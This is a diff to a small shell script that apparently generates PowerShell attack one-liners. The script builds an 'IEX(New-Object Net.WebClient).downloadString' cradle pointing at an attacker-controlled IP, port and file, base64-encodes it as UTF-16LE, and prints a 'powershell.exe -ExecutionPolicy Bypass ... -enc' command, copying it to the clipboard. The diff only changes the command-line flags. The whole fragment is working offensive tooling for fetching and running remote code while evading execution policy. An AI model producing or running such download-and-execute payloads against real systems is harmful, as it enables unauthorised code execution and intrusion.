@@ -6,5 +6,5 @@ fi
 IP=$( IP_No_Clip );                      
 New_IP=$( echo -n $IP );                                                                                                              
 Encoded=$( echo "IEX(New-Object Net.WebClient).downloadString('http://$IP:$1/$2')" | iconv -t UTF-16LE | base64 -w0 );
-echo "powershell.exe -nop -ep bypass -enc $Encoded";
-echo "powershell.exe -nop -ep bypass -enc $Encoded" | clip;
+echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -enc $Encoded";
+echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -enc $Encoded" | clip;
